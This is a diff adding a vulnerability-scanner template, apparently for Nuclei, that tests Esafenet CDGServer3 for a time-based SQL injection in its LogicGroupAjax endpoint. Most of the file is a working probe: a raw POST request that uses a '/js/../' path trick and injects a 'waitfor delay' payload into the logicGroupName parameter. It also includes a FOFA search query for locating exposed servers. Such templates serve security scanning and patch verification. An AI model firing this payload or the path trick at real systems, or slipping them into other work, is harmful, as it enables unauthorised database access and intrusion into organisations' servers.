@@ -1,0 +1,33 @@
+id: esafenet-cdgserver3-LogicGroupAjax-sqli
+info:
+  name: 亿赛通电子文档安全管理系统 LogicGroupAjax - sqli
+  author: leadlife
+  severity: high
+  description: 亿某通电子文档安全管理系统 LogicGroupAjax接口的logicGroupName参数处对传入的数据没有预编译和充足的校验，导致该接口存在SQL注入漏洞，恶意攻击者可能通过该漏洞获取服务器信息或者直接获取服务器权限
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FLogicGroupAjax%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
+  tags: 2025,sqli,esafenet,time
+
+http:
+  - raw:  
+      - |
+        @timeout: 15s
+        POST /CDGServer3/js/../LogicGroupAjax HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+
+        command=isExist&logicGroupName=-1'waitfor delay '0:0:5'--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+          - contains(header,'CDGServer3')
+        condition: and
